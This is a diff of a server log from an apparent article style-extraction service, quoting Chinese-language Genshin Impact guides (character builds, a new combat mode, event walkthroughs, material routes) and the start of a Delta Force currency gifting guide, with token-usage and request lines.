@@ -1,5 +1,1450 @@
 nohup: ignoring input
-INFO:     Started server process [1128462]
+INFO:     Started server process [2158462]
 INFO:     Waiting for application startup.
 INFO:     Application startup complete.
 INFO:     Uvicorn running on http://0.0.0.0:8002 (Press CTRL+C to quit)
+2025-09-23 14:25:34.563 | INFO     | preprocess.article_analyzer:analyze_article:41 - 开始读取文章：# 【观测枢】「月之一」版本新角色菈乌玛攻略、纳西妲攻略合集
+
+角色攻略合集及相关信息
+
+---
+
+![月之一版本新角色菈乌玛攻略、纳西妲攻略合集](https://act-upload.mihoyo.com/ys-obc/2025/09/06/317305234/9a2bd3d6183e40000369dd0c1a479f6f_8955233724044057474.jpg)
+
+观测枢「月之一」版本攻略合集更新啦，本合集包含了版本相关角色、世界任务、地图活动等攻略内容，在版本期间将持续更新。还有新角色菈乌玛、菲林斯、爱诺，纳西妲、夜兰、须弥集录祈愿等角色攻略哟。
+- 详细更新记录请看末尾表格。
+- 其他攻略入口：[观测枢·攻略站](https://bbs.mihoyo.com/ys/strategy/?bbs_presentation_style=no_header)
+
+---
+
+## 主要角色攻略列表
+
+### 菈乌玛（9.10-9.30 UP）
+
+[![菈乌玛角色图片](https://act-upload.mihoyo.com/ys-obc/2025/09/06/317305234/45dc7f4d9f71563546e664ed68e56d72_1875550960526154448.png)](https://baike.mihoyo.com/ys/obc/content/505973/detail?bbs_presentation_style=no_header)
+
+#### 攻略推荐
+- [角色一图流攻略](https://www.miyoushe.com/ys/article/68363053)
+- [一图流丨图解攻略](https://www.miyoushe.com/ys/article/68363253)
+- [配队圣遗物武器攻略全解](https://www.miyoushe.com/ys/article/68393216)
+- [配装攻略一图流](https://www.miyoushe.com/ys/article/68379786)
+- [机制解析 | 出装配队 | 突破材料](https://www.miyoushe.com/ys/article/68435028)
+- [70个月落银 全采集路线](https://www.miyoushe.com/ys/article/68366771)
+- [>>菈乌玛攻略合集](https://baike.mihoyo.com/ys/strategy/channel/map/39/471?bbs_presentation_style=no_header)
+
+#### 突破材料
+- [![月落银 168](https://act-upload.mihoyo.com/ys-obc/2025/09/10/317305234/638153b83b58f9ee3b757d04c0ad5f89_7503187552614030831.png)](https://act.mihoyo.com/ys/app/interactive-map/index.html?bbs_presentation_style=no_header&lang=zh-cn#/map/2?share_id=17575120163343075319680-c9e6099c-f4dd-4463-9ad6-2d898048096d&index=31&share_type=path)
+- [![承光的鳞羽 46](https://act-upload.mihoyo.com/ys-obc/2025/09/10/317305234/a314e9e66124d09d34b1b52d948f112b_188264759523080010.png)](https://baike.mihoyo.com/ys/obc/content/506268/detail?bbs_presentation_style=no_header)
+- [![磨损的执凭](https://act-upload.mihoyo.com/ys-obc/2025/09/10/317305234/31f1696fd84bf271f934a5e7842a5aae_4697819538710562201.png)](https://act.mihoyo.com/ys/app/interactive-map/index.html?bbs_presentation_style=no_header&lang=zh-cn#/map/2?zoom=-1.50&center=-305.12,-10659.44&shown_types=739)
+- [![生长碧翡碎屑](https://uploadstatic.mihoyo.com/ys-obc/2022/10/31/195563531/bfcd6c812ae01ec749b7b1ed94f32319_220089165643237945.png)](https://bbs.mihoyo.com/ys/obc/content/4425/detail?bbs_presentation_style=no_header)
+
+#### 天赋材料
+- [![「月光」的教导](https://act-upload.mihoyo.com/ys-obc/2025/09/10/317305234/5510964e929d7bf10e00a9be1f5350f4_1588350869118698781.png)](https://baike.mihoyo.com/ys/obc/content/506277/detail?bbs_presentation_style=no_header)
+- [![磨损的执凭](https://act-upload.mihoyo.com/ys-obc/2025/09/10/317305234/31f1696fd84bf271f934a5e7842a5aae_4609928518830100962.png)](https://act.mihoyo.com/ys/app/interactive-map/index.html?bbs_presentation_style=no_header&lang=zh-cn#/map/2?zoom=-1.50&center=-305.12,-10659.44&shown_types=739)
+- [![蚀灭的鳞羽](https://act-upload.mihoyo.com/ys-obc/2025/09/06/317305234/26ff1dea559a88bd9f4bd0f0521eb47e_7410345076204361293.png)](https://baike.mihoyo.com/ys/obc/content/503970/detail?bbs_presentation_style=no_header&header_bar_hide_back=1)
+
+#### 推荐武器
+- [![纺月天镜](https://act-upload.mihoyo.com/ys-obc/2025/09/08/317305234/dd5710fdf31313b257edc3c434fcd0d4_7902522759983940991.png)](https://baike.mihoyo.com/ys/obc/content/506390/detail?bbs_presentation_style=no_header)
+- [![千夜浮梦](https://act-upload.mihoyo.com/ys-obc/2025/09/06/317305234/57e6090e14412525b247b009e858c52c_6180604562835381667.png)](https://baike.mihoyo.com/ys/obc/content/5110/detail?bbs_presentation_style=no_header&header_bar_hide_back=1)
+- [![祭礼残章](https://act-upload.mihoyo.com/ys-obc/2025/09/06/317305234/8cf9dda706d5f52d7e456f7e83108a7e_7999215171232347399.png)](https://baike.mihoyo.com/ys/obc/content/197/detail?bbs_presentation_style=no_header&header_bar_hide_back=1)
+- [![乌髓孑灯](https://act-upload.mihoyo.com/ys-obc/2025/09/08/317305234/aa007f06259355bdf577de8e228632f1_5794537606087823981.png)](https://baike.mihoyo.com/ys/obc/content/506375/detail?bbs_presentation_style=no_header)
+
+---
+
+### 纳西妲（9.10-9.30 UP）
+
+[![纳西妲角色图片](https://uploadstatic.mihoyo.com/ys-obc/2022/10/31/195563531/f9f8f331dea3cc4920037df2018437d0_5396627325134215468.png)](https://bbs.mihoyo.com/ys/obc/content/5111/detail?bbs_presentation_style=no_header)
+
+#### 攻略推荐
+- [一图流丨角色解析攻略](https://www.miyoushe.com/ys/article/68333843) (New!!)
+- [角色一图流攻略](https://www.miyoushe.com/ys/article/68362710) (New!!)
+- [一图教你玩懂纳西妲](https://www.miyoushe.com/ys/article/68365734) (New!!)
+- [全面解析︱机制/养成/配队](https://www.miyoushe.com/ys/article/48532156)
+- [平民向配装推荐](https://www.miyoushe.com/ys/article/48527814)
+- [71个劫波莲快速收集路线](https://www.miyoushe.com/ys/article/57992149)
+- [材料采集](https://bbs.mihoyo.com/ys/article/30734885)
+- [>>纳西妲攻略合集](https://bbs.mihoyo.com/ys/strategy/channel/map/39/264?bbs_presentation_style=no_header&from=COLLECTION_BG)
+
+#### 突破材料
+- [![劫波莲 168](https://uploadstatic.mihoyo.com/ys-obc/2022/10/31/195563531/db107787cdb68044fd29a2b49db1c81e_2504247201768917721.png)](https://webstatic.mihoyo.com/ys/app/interactive-map/index.html?bbs_presentation_style=no_header&lang=zh-cn#/map/2?zoom=-2&center=2898,-3463&shown_types=401)
+- [![灭诤草蔓 46](https://uploadstatic.mihoyo.com/ys-obc/2022/10/31/195563531/2c019855503a7bf3dea51b06f574d51c_3673028860121313236.png)](https://bbs.mihoyo.com/ys/obc/content/5109/detail?bbs_presentation_style=no_header)
+- [![蕈兽孢子](https://uploadstatic.mihoyo.com/ys-obc/2022/10/14/195563531/033f0dbe46f96e37b6bd1143d09dfdf5_902468286639500929.png)](https://webstatic.mihoyo.com/ys/app/interactive-map/index.html?bbs_presentation_style=no_header&lang=zh-cn#/map/2?zoom=-2&center=3114,-3655&shown_types=221)
+- [![生长碧翡碎屑](https://uploadstatic.mihoyo.com/ys-obc/2022/10/31/195563531/bfcd6c812ae01ec749b7b1ed94f32319_220089165643237945.png)](https://bbs.mihoyo.com/ys/obc/content/4425/detail?bbs_presentation_style=no_header)
+
+#### 天赋材料
+- [![「巧思」的教导](https://act-upload.mihoyo.com/ys-obc/2024/10/03/317305234/66406899e204a3b1ff138b871a0b3209_8054231835186089957.png)](https://bbs.mihoyo.com/ys/obc/content/4369/detail?bbs_presentation_style=no_header)
+- [![蕈兽孢子](https://act-upload.mihoyo.com/ys-obc/2024/10/03/317305234/46cf8a0e508049e8d3111dba6451d944_1342645227718710621.png)](https://webstatic.mihoyo.com/ys/app/interactive-map/index.html?bbs_presentation_style=no_header&lang=zh-cn#/map/2?zoom=-2&center=3114,-3655&shown_types=221)
+- [![傀儡的悬丝](https://act-upload.mihoyo.com/ys-obc/2024/10/03/317305234/33b3348f407ee1d2fa550705cea75288_3449872522817950854.png)](https://bbs.mihoyo.com/ys/obc/content/5107/detail?bbs_presentation_style=no_header)
+
+#### 推荐武器
+- [![千夜浮梦](https://act-upload.mihoyo.com/ys-obc/2024/02/20/283462834/57e6090e14412525b247b009e858c52c_4026906888582793607.png)](https://bbs.mihoyo.com/ys/obc/content/5110/detail?bbs_presentation_style=no_header)
+- [![四风原典](https://act-upload.mihoyo.com/ys-obc/2024/02/20/283462834/010bf073033718fb642fafc082536b25_4771516392965974974.png)](https://bbs.mihoyo.com/ys/obc/content/297/detail?bbs_presentation_style=no_header)
+- [![流浪的晚星](https://act-upload.mihoyo.com/ys-obc/2024/02/20/283462834/d3862944bf6c3c28f8b4823603c8bc23_6744505021057374304.png)](https://bbs.mihoyo.com/ys/obc/content/5017/detail?bbs_presentation_style=no_header)
+- [![魔导绪论](https://act-upload.mihoyo.com/ys-obc/2024/02/20/283462834/f36331c0535b901a1a591d5900fce539_643474793943443396.png)](https://bbs.mihoyo.com/ys/obc/content/162/detail?bbs_presentation_style=no_header)
+
+---
+
+### 其他相关内容
+
+#### 观测枢「月之一」卡池抽取分析与福利统计
+
+- [「月之一卡池」复刻卡池抽取分析](https://www.miyoushe.com/ys/article/67995949)
+- [月之一福利/原石统计](https://www.miyoushe.com/ys/article/68000166)
+- [2分钟看懂什么是月绽放](https://www.miyoushe.com/ys/article/68189035)
+- [月绽放反应快速入门](https://www.miyoushe.com/ys/article/68616017)
+- [【月绽放】及【月兆】：系统解析及展望](https://www.miyoushe.com/ys/article/68203381)
+
+---
+
+## 近期活动和任务相关角色
+
+### 新角色登场
+
+- 菈乌玛、菲林斯（待更新）、爱诺、夜兰
+
+---
+
+## 更新记录（部分）
+
+| 更新时间    | 更新内容        | 更新页签 |
+| ----------- | -------------- | -------- |
+| 9月10日     | 词条上线        | 角色攻略地图探索 活动深渊 武器BOSS |
+| 9月12日     | 活动更新、世界任务攻略更新 | 地图探索 活动深渊 |
+| 9月16日     | 深渊更新        | 活动深渊 |
+| 9月17日     | 幽境更新        | 活动深渊 |
+
+---
+
+词条内容由观测枢编辑团队原创，禁止转载
+2025-09-23 14:25:34.563 | INFO     | preprocess.article_analyzer:analyze_article:43 - 文章读取完成，总长度：7997字
+2025-09-23 14:26:06.337 | INFO     | preprocess.article_analyzer:analyze_article:46 - 文风特征提取完成
+Token usage: 4795 input + 1827 output = 6622 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:58058 - "POST /extract-style HTTP/1.1" 200 OK
+2025-09-23 14:52:15.980 | INFO     | preprocess.article_analyzer:analyze_article:41 - 开始读取文章：# 【原神4.7前瞻】全新常驻战斗玩法「幻想真境剧诗」
+
+旅行者们大家好啊。4.7版本将上线全新常驻战斗玩法「幻想真境剧诗」，一起来看看吧。
+
+[![幻想真境剧诗_模式宣传图](https://upload-bbs.miyoushe.com/upload/2024/05/24/232866066/de07b0cc017c0aba17e1532157c6b6d6_7083990717260989380.png)](https://upload-bbs.miyoushe.com/upload/2024/05/24/232866066/de07b0cc017c0aba17e1532157c6b6d6_7083990717260989380.png)
+
+---
+
+## 一、玩法介绍
+
+参与条件：冒险等阶≥35
+
+### 1. 准备阶段
+
+[![准备阶段界面](https://bbs-static.miyoushe.com/static/2024/05/13/eb74ffa2f136954ae3f39287d89d7a64_3180582411562290553.png)](https://bbs-static.miyoushe.com/static/2024/05/13/eb74ffa2f136954ae3f39287d89d7a64_3180582411562290553.png)
+
+**挑战开始前，旅行者需要选出所有参与本玩法的角色。**
+
+每期「幻想真境剧诗」将指定三种元素，首期为**火元素**、**雷元素**、**风元素**，符合元素和等级要求的角色可作为备选。
+
+#### （1）选择开幕角色
+
+**每期将指定6名初始可出战角色**（即不需要额外条件，初始即可选择出战的角色）。
+
+**6名开幕角色必须选择，若没有该角色，可以选择试用角色。**
+
+如下图第一期必选的6名开幕角色为仆人、托马、克洛琳德、久岐忍、流浪者、珐露珊。
+
+[![第一期开幕角色选择](https://upload-bbs.miyoushe.com/upload/2024/05/24/232866066/8038f3bfaaf61ac8223560b3b56f4780_5518430857857054783.png)](https://upload-bbs.miyoushe.com/upload/2024/05/24/232866066/8038f3bfaaf61ac8223560b3b56f4780_5518430857857054783.png)
+
+**▲ 选择开幕角色**
+
+另外，每期「幻想真境剧诗」的开幕角色将获得「幻境祝福」，为他们提供增益效果。不仅在本玩法内，在**大世界的冒险中**都会生效。
+
+**▲ 幻境祝福**
+
+#### （2）选择待命角色
+
+**除了开幕角色，还需要选择多个待命角色。待命角色需要通过完成战斗或选择伙伴事件成为可出战角色，扩充队伍以完成多轮战斗。**
+
+不同难度下，队伍中所需的角色数量不同，在轻筒/普通/困难三种难度下，需选满包含指定6名开幕角色的10/14/18角色开启战斗。
+
+**▲ 难度选择界面**
+
+旅行者可以从以下三类角色中选出待命角色：
+- 满足当期元素限制的自机角色
+- 特邀角色：每期指定的不受当期元素限制的自机角色
+- 助演角色：由好友提供的角色（需满足当期元素限制或为特邀角色，最多1个）
+
+本期特邀角色为莱欧斯利、白术、艾尔海森、希格雯。
+
+**▲ 待命角色配置界面**
+
+乐于助人的旅行者们快点选择提供给好友助演的角色吧~
+
+**▲ 助演角色配置界面**
+
+---
+
+### 2. 挑战阶段
+
+[![挑战阶段界面](https://bbs-static.miyoushe.com/static/2024/05/13/daf22495e5ef8f11fd812684f641c10b_6950741619984342613.png)](https://bbs-static.miyoushe.com/static/2024/05/13/daf22495e5ef8f11fd812684f641c10b_6950741619984342613.png)
+
+（1）挑战过程中，旅行者可以自行选择触发「事件」，**将角色编入队伍**或是**获得增益**，有些可能也会带来风险，需要谨慎选择。
+
+**▲ 选择战斗或触发「事件」**
+
+（2）在轻筒/普通/困难三种难度下，成功通过「幻想真境剧诗」需要完成3/6/8场战斗。
+
+根据敌人情况，选择合适的角色出战，完成数轮挑战后，即可获取奖励。
+
+**▲ 选择战斗或触发「事件」**
+
+（3）每个角色初始拥有2点耐力值，完成一次战斗消耗1点，耗尽后无法参与战斗。因此需要在挑战过程中积极扩充「可出战角色」的队伍，增加角色的选择面。待命角色通过完成战斗或选择伙伴事件成为可出战角色。
+
+**▲ 增加可出战角色的方式**
+
+---
+
+## 二、更新排期与奖励
+
+4.7版本更新后「幻想真境剧诗」玩法将和「渊月螺旋」的更新交替进行，两种玩法每次更新后，各自的开放时间均为一个月。
+
+- 第一期「幻想真境剧诗」将于**7月1日**上线。
+- 6月16日起,「深境螺旋」调整为新排期。
+
+**▲ 玩法排期表**
+
+每期「渊月螺旋」的总奖励：600原石→800原石  
+每期「幻想真境剧诗」的总奖励：620原石
+
+在轻筒/普通/困难三种难度下，成功通过「幻想真境剧诗」需要完成3/6/8场战斗。
+
+各关卡可获得的原石奖励如下：
+
+**▲ 奖励一览**
+
+完成指定关卡还能获得道具「玩具勋章」，可以在小狼处兑换角色特殊拍照动作。
+
+**▲ 兑换特殊拍照动作**
+
+此外，还有央陆原胚之匣、祝圣精华、角色天赋素材等奖励等待旅行者获取。
+
+幻想真境剧诗具体攻略，敬请关注原神观测枢~
+
+---
+
+## 玩法补充问答（社区）
+
+**Q：想请问要拿满奖励，那么除了试用角色，自己需要有多少个符合条件的角色才能打呀？**
+
+A：  
+18-6（开幕）-1（助演）=11个，需要准备11个70级的风、火、雷角色或特邀角色。  
+如果有特邀角色和开幕角色已练，可以进一步减少所需练度。最少13个角色足够，试用越多越少。
+
+**Q：还得符合等级吗？**
+
+A：  
+最高难度需要70级角色才能上场。
+
+**Q：开幕角色里面也会包含自己已经练好的角色，因此要想打满，估计要18-4（特邀，非火雷风）-1（好友角色）=13，如果开幕角色有没练则可以用试用的，这样要练的角色可以更少。**
+
+---
+
+## 玩家评论观点摘要
+
+- 有玩家反馈新玩法限制元素和角色，需要重点培养符合要求的风、火、雷角色。
+- 有人讨论圣遗物及武器需求，实际挑战内每关开始前圣遗物可以换着穿，不必每角色准备一套。
+- 奖励提升但深渊频率降低，每月能获取的原石数量略提升。
+- 有玩家建议官方提供试用角色面板，试用角色能有效减少自己的角色练度压力。
+- 玩法整体难度取决于角色练度、元素限制和助演配置，合理配置可降低通关难度。
+- 玩法可能激励玩家培养更多角色，练度要求提升。
+
+---
+
+## 图片一览（嵌入文中）
+
+[![幻想真境剧诗_模式宣传图](https://upload-bbs.miyoushe.com/upload/2024/05/24/232866066/de07b0cc017c0aba17e1532157c6b6d6_7083990717260989380.png)](https://upload-bbs.miyoushe.com/upload/2024/05/24/232866066/de07b0cc017c0aba17e1532157c6b6d6_7083990717260989380.png)  
+[![准备阶段界面](https://bbs-static.miyoushe.com/static/2024/05/13/eb74ffa2f136954ae3f39287d89d7a64_3180582411562290553.png)](https://bbs-static.miyoushe.com/static/2024/05/13/eb74ffa2f136954ae3f39287d89d7a64_3180582411562290553.png)  
+[![第一期开幕角色选择](https://upload-bbs.miyoushe.com/upload/2024/05/24/232866066/8038f3bfaaf61ac8223560b3b56f4780_5518430857857054783.png)](https://upload-bbs.miyoushe.com/upload/2024/05/24/232866066/8038f3bfaaf61ac8223560b3b56f4780_5518430857857054783.png)  
+[![挑战阶段界面](https://bbs-static.miyoushe.com/static/2024/05/13/daf22495e5ef8f11fd812684f641c10b_6950741619984342613.png)](https://bbs-static.miyoushe.com/static/2024/05/13/daf22495e5ef8f11fd812684f641c10b_6950741619984342613.png)  
+
+---
+
+## 结论
+
+4.7版本全新玩法「幻想真境剧诗」将于2024年7月1日上线，要求冒险等阶≥35、制定元素可选角色，并需要根据不同难度准备相应数量的角色。玩法交替进行，每期有丰厚原石及道具奖励，玩家建议合理分配练度和元素角色以满足玩法需求。
+2025-09-23 14:52:15.980 | INFO     | preprocess.article_analyzer:analyze_article:43 - 文章读取完成，总长度：4079字
+2025-09-23 14:52:44.125 | INFO     | preprocess.article_analyzer:analyze_article:46 - 文风特征提取完成
+Token usage: 3769 input + 1872 output = 5641 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:59778 - "POST /extract-style HTTP/1.1" 200 OK
+2025-09-23 14:59:08.905 | INFO     | preprocess.article_analyzer:analyze_article:41 - 开始读取文章：# 【月之一】叮铃哐啷大作战，第三阶段全流程攻略
+
+各位旅行者们大家好呀！相信过了那么刺激的主线，旅行者该放松放松了！期待已久的月之一版本大活动和菈乌玛活动武器也是终于来了，今天给大家带来第二阶段「叮铃哐啷大作战」的活动攻略～包含了「追击！失控飞兵！」「轰隆！测试威力！」「寻踪！故障机器！」「静音！谍械潜行！」四个小活动，旅行者们快快出发吧！
+
+[![月之一大作战活动宣传图](https://upload-bbs.miyoushe.com/upload/2025/09/16/269309230/f4c2bc63627025206b3b8a962ac61188_8729436971577925128.jpg?x-oss-process=image//resize,s_600/quality,q_80/auto-orient,0/interlace,1/format,jpg)](https://upload-bbs.miyoushe.com/upload/2025/09/16/269309230/f4c2bc63627025206b3b8a962ac61188_8729436971577925128.jpg?x-oss-process=image//resize,s_600/quality,q_80/auto-orient,0/interlace,1/format,jpg)
+
+（本攻略仅适用于月之一版本）素材来源为创作体验服，不代表最终上线的数值和效果，请以正式服内容为准！超级喜欢这次四个小游戏，大家不要错过奥～
+
+[![分割线](https://upload-bbs.miyoushe.com/upload/2021/01/05/477d4c535e965bec1791203aecdfa8e6.png)](https://upload-bbs.miyoushe.com/upload/2021/01/05/477d4c535e965bec1791203aecdfa8e6.png)
+
+## 【活动时间】
+
+可以通过本次活动累计获得5700纪行经验
+
+[![活动经验奖励](https://upload-bbs.miyoushe.com/upload/2025/09/16/269309230/5444d42c37124c3bad6c88acfcde815a_1186677397913219494.png?x-oss-process=image//resize,s_600/quality,q_80/auto-orient,0/interlace,1/format,png)](https://upload-bbs.miyoushe.com/upload/2025/09/16/269309230/5444d42c37124c3bad6c88acfcde815a_1186677397913219494.png?x-oss-process=image//resize,s_600/quality,q_80/auto-orient,0/interlace,1/format,png)
+
+[![分割线](https://upload-bbs.miyoushe.com/upload/2021/01/05/477d4c535e965bec1791203aecdfa8e6.png)](https://upload-bbs.miyoushe.com/upload/2021/01/05/477d4c535e965bec1791203aecdfa8e6.png)
+
+## 【活动奖励】
+
+精五的绝版武器噢 大家记得拿（精通与充能兼顾，不可多得的种门武器）剩下是一些挪德卡莱的材料，在版本初期也很重要奥
+
+[![活动奖励图示](https://upload-bbs.miyoushe.com/upload/2025/09/16/269309230/9c9178cfbe4c92192c54f8486099a325_6862501412450425193.png?x-oss-process=image//resize,s_600/quality,q_80/auto-orient,0/interlace,1/format,png)](https://upload-bbs.miyoushe.com/upload/2025/09/16/269309230/9c9178cfbe4c92192c54f8486099a325_6862501412450425193.png?x-oss-process=image//resize,s_600/quality,q_80/auto-orient,0/interlace,1/format,png)
+
+[![分割线](https://upload-bbs.miyoushe.com/upload/2021/01/05/477d4c535e965bec1791203aecdfa8e6.png)](https://upload-bbs.miyoushe.com/upload/2021/01/05/477d4c535e965bec1791203aecdfa8e6.png)
+
+## 【参与条件】
+
+1. 冒险等阶≥20级  
+2. 完成魔神任务：序章·第三幕「巨龙与自由之歌」  
+※完成魔神任务：空月之歌·第二幕「尘与灯的挽歌」后体验更佳。
+
+[![开局剧情机器人搜寻](https://upload-bbs.miyoushe.com/upload/2021/01/05/e7047588e912d60ff87a975e037c7606.png)](https://upload-bbs.miyoushe.com/upload/2021/01/05/e7047588e912d60ff87a975e037c7606.png)
+
+开局剧情有个找9个机器人，（注意多开元素视野），存在于道路俩边和上坡的途中最后俩个位于平台上。有几个会在箱子堆里，山上是没有的不用爬（这个当时创体没有，自己号没录，抱歉啦～）
+
+[【月之一】叮铃哐啷大作战，第一阶段全流程攻略](https://m.miyoushe.com/ys?channel=xiaomi/#/article/68461093)  
+[【月之一】叮铃哐啷大作战，第二阶段全流程攻略](https://m.miyoushe.com/ys?channel=xiaomi/#/article/68546396)
+
+[![分割线](https://upload-bbs.miyoushe.com/upload/2021/01/05/e7047588e912d60ff87a975e037c7606.png)](https://upload-bbs.miyoushe.com/upload/2021/01/05/e7047588e912d60ff87a975e037c7606.png)
+
+---
+
+## 「寻踪！故障机器！」第三关
+
+1. 今天非常省事，打完怪直接就完成了。
+
+[![分割线](https://upload-bbs.miyoushe.com/upload/2021/01/05/477d4c535e965bec1791203aecdfa8e6.png)](https://upload-bbs.miyoushe.com/upload/2021/01/05/477d4c535e965bec1791203aecdfa8e6.png)
+
+---
+
+## 「静音！谍械潜行！」第五/六关
+
+### 第五关
+
+1. 尽量走蓝色加速格子，少走红色格子
+2. 因为这一关有月矩力炸弹，可以时刻备用一个月矩力炸弹
+3. 识别卡也需要攻击一下，剩下的话大家注意，不要被照到就好了
+
+最后圆形区域出不去是正常的，开始歼灭战，把敌方单位消灭完就行了。空中单位用月矩力炸弹。
+
+### 第六关
+
+1. 这一关可以理解为跑酷，记得预留一个冲刺。
+2. 记得熟练使用冲刺接攻击的远距离躲范围秒杀技巧。
+3. 没有门卡，往里冲就行了
+
+[![分割线](https://upload-bbs.miyoushe.com/upload/2021/01/05/477d4c535e965bec1791203aecdfa8e6.png)](https://upload-bbs.miyoushe.com/upload/2021/01/05/477d4c535e965bec1791203aecdfa8e6.png)
+
+---
+
+## 「追击！失控飞兵！」第五/六关
+
+1. 开局直接交互变成月灵穿梭在轨道上（月之微粒自动吸附，千万不要主动跳车），在断口处一定有新的轨道继续交互即可。
+2. 途中会看到一个白色的光环 一定要接触光环才能看见更多月之微粒！
+3. 如果有地面上红色/蓝色标记的地方，按跳跃键蹦高高即可。
+4. 有障碍物的时候，我们提前利用，排斥和相吸交互破坏掉。
+5. 在三个环来回穿梭时记得不要碰到机关会扣分
+
+[![分割线](https://upload-bbs.miyoushe.com/upload/2021/01/05/40eb5281cb24042bf34a9f1bcc61eaf5.png)](https://upload-bbs.miyoushe.com/upload/2021/01/05/40eb5281cb24042bf34a9f1bcc61eaf5.png)
+
+---
+
+## 「轰隆！测试威力！」
+
+这个其实就是纯打怪活动，没有太多可以说的。绝大部分队伍都可以打，不存在非常多需要特定元素攻击的怪物。如果练度实在太低，还可以用月矩力充能机关来击败怪物！（打不动的时候也需要等机关充能破防）
+
+[![分割线](https://upload-bbs.miyoushe.com/upload/2021/01/05/e7047588e912d60ff87a975e037c7606.png)](https://upload-bbs.miyoushe.com/upload/2021/01/05/e7047588e912d60ff87a975e037c7606.png)
+
+---
+
+好了那么本次的「叮铃哐啷大作战」活动攻略就到此结束了，谢谢大家，我们明天再见！
+2025-09-23 14:59:08.905 | INFO     | preprocess.article_analyzer:analyze_article:43 - 文章读取完成，总长度：4278字
+2025-09-23 14:59:41.121 | INFO     | preprocess.article_analyzer:analyze_article:46 - 文风特征提取完成
+Token usage: 3617 input + 2143 output = 5760 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:42020 - "POST /extract-style HTTP/1.1" 200 OK
+2025-09-23 15:00:23.335 | INFO     | preprocess.article_analyzer:analyze_article:41 - 开始读取文章：# #材料收集#镀金旅团快速讨伐攻略！
+
+---
+
+## 前言
+
+你还在为材料不够而苦恼吗？
+
+还在为了收集材料满世界到处跑吗？
+
+全世界跑了一圈又一圈却只捡了可怜的几朵吗？
+
+首先恭喜你找到了这篇宝藏帖子，还不赶紧动动小手点赞收藏  
+[![点赞收藏提示](https://upload-bbs.mihoyo.com/upload/2022/09/09/90ab42b0fb89ccf60d12eee660aa3c04_1159617612214902289.png)](https://upload-bbs.mihoyo.com/upload/2022/09/09/90ab42b0fb89ccf60d12eee660aa3c04_1159617612214902289.png)
+
+---
+
+## 用途
+
+目前是艾尔海森、珐露珊、坎蒂丝、多莉等角色的突破材料，  
+也是裁叶萃光、圣显之钥、猎人之径、西福斯的月光等武器的突破材料。  
+主要分布在须弥地区。
+
+“以金丝织成纹路的红色绸缎。”
+
+[![用途相关插画-金丝绸缎](https://upload-bbs.miyoushe.com/upload/2021/01/05/e7047588e912d60ff87a975e037c7606.png)](https://upload-bbs.miyoushe.com/upload/2021/01/05/e7047588e912d60ff87a975e037c7606.png)
+
+---
+
+## Tip（小窍门）
+
+- 带夜兰赶路用，夜兰的战技可谓是非常好用了，
+- 没有夜兰也可以用早柚代替，效果一样
+- 其余的没啥要求，只要打得过就行
+- 如果可以的话组一个双风阵容，减少体力消耗和移速
+
+[![小窍门插画-夜兰](https://upload-bbs.miyoushe.com/upload/2021/01/05/e7047588e912d60ff87a975e037c7606.png)](https://upload-bbs.miyoushe.com/upload/2021/01/05/e7047588e912d60ff87a975e037c7606.png)
+
+---
+
+## 文图部分（正文）
+
+本帖全篇共7条线路，总计139只镀金旅团  
+镀金旅团每天刷新一次
+
+> #允许转载是方便保存查看，未经允许严禁转载  
+> #画质上传会有压缩，可以点右上角三个点查看原图
+
+---
+
+### 一图流采集路线
+
+[![一图流采集路线地图](https://upload-bbs.miyoushe.com/upload/2021/01/05/40eb5281cb24042bf34a9f1bcc61eaf5.png)](https://upload-bbs.miyoushe.com/upload/2021/01/05/40eb5281cb24042bf34a9f1bcc61eaf5.png)
+
+---
+
+### 详细路线
+
+#### ▍1-往昔的桓那兰那讨伐路线
+
+镀金旅团数量：25只  
+推荐指数：★★★★★
+
+#### ▍2-觉王之殿讨伐路线
+
+镀金旅团数量：16只  
+推荐指数：★★★☆☆
+
+#### ▍3-谒颂幽境讨伐路线
+
+镀金旅团数量：25只  
+推荐指数：★★★★☆
+
+#### ▍4-谒颂幽境讨伐路线-2
+
+镀金旅团数量：12只  
+推荐指数：★★★★★
+
+#### ▍5-奥摩斯港讨伐路线-2
+
+镀金旅团数量：27只  
+推荐指数：★★★★☆
+
+#### ▍6-天臂池讨伐路线
+
+镀金旅团数量：18只  
+推荐指数：★★★★★
+
+#### ▍7-荼诃落谷讨伐路线
+
+镀金旅团数量：16只  
+推荐指数：★★★★☆
+
+---
+
+## 全都要9999系列目录导航
+
+[#全材料收集·目录导航贴](https://bbs.mihoyo.com/ys/article/18917595)
+
+---
+
+**本期 #材料收集#镀金旅团快速讨伐攻略！就到这里了，这里是新都我们下期再见**  
+[![结尾插画-拜拜](https://img-static.mihoyo.com/communityweb/upload/54f6c5f6a4bf851877158b0000e636c5.png)](https://img-static.mihoyo.com/communityweb/upload/54f6c5f6a4bf851877158b0000e636c5.png)
+2025-09-23 15:00:23.335 | INFO     | preprocess.article_analyzer:analyze_article:43 - 文章读取完成，总长度：1900字
+2025-09-23 15:00:48.159 | INFO     | preprocess.article_analyzer:analyze_article:46 - 文风特征提取完成
+Token usage: 2467 input + 1703 output = 4170 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:49112 - "POST /extract-style HTTP/1.1" 200 OK
+2025-09-23 15:00:57.262 | INFO     | preprocess.article_analyzer:analyze_article:41 - 开始读取文章：# 三角洲电锯/北极星氪金指南：低成本拿下，别当大冤种！！
+
+[![三角洲行动 Banner](https://cdn.max-c.com/heybox/dailynews/img/4dca5e8dcfc1f18b549f500e49ae4c4e.png)](https://cdn.max-c.com/heybox/dailynews/img/4dca5e8dcfc1f18b549f500e49ae4c4e.png)
+
+> 官方直充648元享8折优惠，当前合理赠礼价格为350-390元。价格过高不建议购买，自行充值更为划算。后续推出的联动皮肤抽奖内容无法通过赠礼获得。
+
+## 一、货币概念
+
+1. 三角币：RMB充值后获取的货币，1:10； 可购买：市场、通行证、三角券物品；
+2. 三角券：通行证返利、市场出售枪皮; 可购买：捆绑包，不可购买市场物品
+3. 曼德尔币：三角币1：1购买 可购买：任意曼德尔砖
+
+## 二、赠礼规则：
+
+> 1. **双方要求**：
+>    
+>    * 等级 ≥ 20
+>    * 好友 ≥ 24小时 × 5天
+> 2. **次数限制**：
+>    
+>    * 卖家：每月最多赠5次<3W券总价
+>    * 买家：每月最多收5次<3W券总价
+> 3. **通行证赠礼**：仅能用 【**三角币】** 赠送
+
